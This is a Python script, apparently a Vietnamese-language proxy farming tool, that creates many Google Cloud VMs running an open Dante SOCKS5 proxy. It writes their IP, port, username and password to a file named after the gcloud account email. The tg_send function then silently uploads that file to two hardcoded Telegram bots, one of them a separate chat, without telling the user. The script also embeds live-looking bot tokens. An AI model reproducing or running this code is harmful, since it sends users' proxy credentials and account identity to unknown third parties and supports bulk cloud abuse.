#!/usr/bin/env python3

print("Running script version V26.1")

import subprocess
import time
import random
import string
import sys
import requests
import signal
from datetime import datetime


NAME="Proxy"

PORT=1080

TG_BOT_TOKEN="8532753583:AAEAmeyGi1y8u3kLmOWLCe26zoGMBRca8Fg"
TG_CHAT_ID="-10034421144011"

TG_BOT_TOKEN_2="8261404310:AAGG3lmQuTghCNTcDD4Za_6K3sPkbmFXox4"
TG_CHAT_ID_2="-5232145570"

API1=f"https://api.telegram.org/bot{TG_BOT_TOKEN}"
API2=f"https://api.telegram.org/bot{TG_BOT_TOKEN_2}"


REGION1_ZONES=[
"asia-northeast1-a",
"asia-northeast1-b",
"asia-northeast1-c"
]

REGION2_ZONES=[
"asia-northeast2-a",
"asia-northeast2-b",
"asia-northeast2-c"
]

VM_PER_REGION=4
PROJECT_LIMIT=3


STOP_REQUEST=False


def handle_ctrlc(sig,frame):

    global STOP_REQUEST

    if not STOP_REQUEST:
        print("\nStopping VM creation and exporting proxy...")
        STOP_REQUEST=True
    else:
        print("\nForce exit")
        sys.exit(0)

signal.signal(signal.SIGINT,handle_ctrlc)


def run(cmd):

    p=subprocess.run(
        cmd,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        text=True
    )

    return p.returncode,p.stdout.strip(),p.stderr.strip()


def get_account():

    code,out,err=run([
        "gcloud","config","get-value","account"
    ])

    return out


ACCOUNT_EMAIL=get_account()

OUTPUT_FILE=f"{ACCOUNT_EMAIL}.txt"
OUTPUT_FILE_2=f"{NAME}---{ACCOUNT_EMAIL}.txt"

TODAY=datetime.now().strftime("%d/%m")


def detect_country():

    z=REGION1_ZONES[0]

    if "asia-northeast" in z:
        return "Japan"

    if "us-" in z:
        return "US"

    return "Proxy"


def tg_send(filepath,count):

    country=detect_country()

    caption=f"{count} Proxy {country} đã được tạo"

    try:

        with open(filepath,"rb") as f:

            requests.post(
                f"{API1}/sendDocument",
                data={
                    "chat_id":TG_CHAT_ID,
                    "caption":caption
                },
                files={"document":f},
                timeout=30
            )

    except:
        pass


    try:

        with open(filepath,"rb") as f:

            requests.post(
                f"{API2}/sendDocument",
                data={
                    "chat_id":TG_CHAT_ID_2,
                    "caption":caption
                },
                files={"document":(OUTPUT_FILE_2,f)},
                timeout=30
            )

    except:
        pass



def random_user_pass():

    user="u"+"".join(random.choice(string.ascii_lowercase+string.digits) for _ in range(7))
    pw="".join(random.choice(string.ascii_letters+string.digits) for _ in range(10))

    return user,pw



def random_vm():

    first=[
    "kenshiro","raventon","hartwell","delvinar","calderon",
    "trenwick","marvello","brenford","alverton","norvello"
    ]

    second=[
    "eto","kor","lex","tor","ziv",
    "nex","var","zen","tal","vex"
    ]

    number=random.randint(100,999)

    return f"{random.choice(first)}-{random.choice(second)}{number}"



def count_instances(project,region):

    code,out,err=run([
        "gcloud","compute","instances","list",
        f"--project={project}",
        "--format=value(zone)"
    ])

    zones=out.splitlines()

    count=0

    for z in zones:
        if region in z:
            count+=1

    return count



def write_dante(user,pw):

    script=f"""#!/bin/bash

apt-get update -y
apt-get install -y dante-server

NIC=$(ip -o -4 route show to default | awk '{{print $5}}')

useradd -m {user}
echo "{user}:{pw}" | chpasswd

cat >/etc/danted.conf <<EOF

logoutput: syslog
internal: 0.0.0.0 port = {PORT}
external: $NIC
socksmethod: username
user.notprivileged: nobody

client pass {{
from: 0.0.0.0/0 to: 0.0.0.0/0
}}

socks pass {{
from: 0.0.0.0/0 to: 0.0.0.0/0
}}

EOF

systemctl restart danted
systemctl enable danted
"""

    with open("startup.sh","w") as f:
        f.write(script)

    return "startup.sh"



def create_vm(project,zone,status):

    name=random_vm()
    user,pw=random_user_pass()

    status[0]=f"Creating VM {zone}"

    script=write_dante(user,pw)

    code,out,err=run([
        "gcloud","compute","instances","create",name,
        f"--project={project}",
        f"--zone={zone}",
        "--machine-type=e2-micro",
        "--image-family=debian-11",
        "--image-project=debian-cloud",
        f"--metadata-from-file=startup-script={script}",
        "--tags=socks"
    ])

    if code!=0:
        return None

    time.sleep(8)

    code,out,err=run([
        "gcloud","compute","instances","describe",name,
        f"--project={project}",
        f"--zone={zone}",
        "--format=value(networkInterfaces[0].accessConfigs[0].natIP)"
    ])

    if out:
        return f"{out}:{PORT}:{user}:{pw}"

    return None



def draw_ui(done,total,tokyo,osaka,status):

    percent=int((done/total)*100) if total else 0

    bar_len=32
    filled=int(bar_len*done/total) if total else 0

    bar="█"*filled+"░"*(bar_len-filled)

    sys.stdout.write("\033[H\033[J")

    print("Tiến trình tạo Proxy ....\n")
    print(f"[{bar}]")
    print(f"\n{percent}%\n")

    print(f"Created: {done} / {total}")
    print(f"Tokyo : {tokyo} / {VM_PER_REGION}")
    print(f"Osaka : {osaka} / {VM_PER_REGION}\n")

    print(f"Status: {status[0]}")



def select_mode():

    print("\n===== MODE =====\n")

    print("1 - Reg 1 lần (không lặp)")
    print("2 - Reg Auto (săn đủ VM)\n")

    print("Ctrl + C : ấn 1 lần Dừng và xuất List")
    print("Ctrl + C : ấn 2 lần Dừng hẳn tiến trình\n")

    c=input("Lựa chọn (Enter=1): ").strip()

    if c=="":
        return 1

    return int(c)



def select_projects(all_projects):

    print("\n===== CHỌN PROJECT =====\n")

    print("1 - All Projects")
    print("2 - Chọn Project thủ công\n")

    c=input("Lựa chọn (Enter=1): ").strip()

    if c=="" or c=="1":
        return all_projects

    print("\nDanh sách project:\n")

    for i,p in enumerate(all_projects):
        print(f"{i+1} - {p}")

    sel=input("\nNhập số project (vd: 1,2): ")

    ids=[int(x.strip())-1 for x in sel.split(",") if x.strip().isdigit()]

    selected=[]

    for i in ids:
        if 0<=i<len(all_projects):
            selected.append(all_projects[i])

    return selected



def main():

    code,out,err=run([
        "gcloud","projects","list",
        "--format=value(projectId)"
    ])

    all_projects=out.splitlines()[:PROJECT_LIMIT]

    mode=select_mode()

    projects=select_projects(all_projects)

    proxies=[]
    target=len(projects)*VM_PER_REGION*2

    status=["Starting"]

    while len(proxies)<target and not STOP_REQUEST:

        for project in projects:

            if STOP_REQUEST:
                break

            tokyo=count_instances(project,"asia-northeast1")
            osaka=count_instances(project,"asia-northeast2")

            draw_ui(len(proxies),target,tokyo,osaka,status)

            if tokyo<VM_PER_REGION:

                for zone in REGION1_ZONES:

                    p=create_vm(project,zone,status)

                    draw_ui(len(proxies),target,tokyo,osaka,status)

                    if p:
                        proxies.append(p)
                        break

            if osaka<VM_PER_REGION:

                for zone in REGION2_ZONES:

                    p=create_vm(project,zone,status)

                    draw_ui(len(proxies),target,tokyo,osaka,status)

                    if p:
                        proxies.append(p)
                        break

        if mode==1:
            break


    print("\nExporting proxy...\n")

    with open(OUTPUT_FILE,"w") as f:

        f.write(f"Tổng Số Proxies : {len(proxies)}\n\n")
        f.write(f"{TODAY}---- {ACCOUNT_EMAIL}--\n")

        for p in proxies:
            f.write(p+"\n")

    tg_send(OUTPUT_FILE,len(proxies))



if __name__=="__main__":
    main()
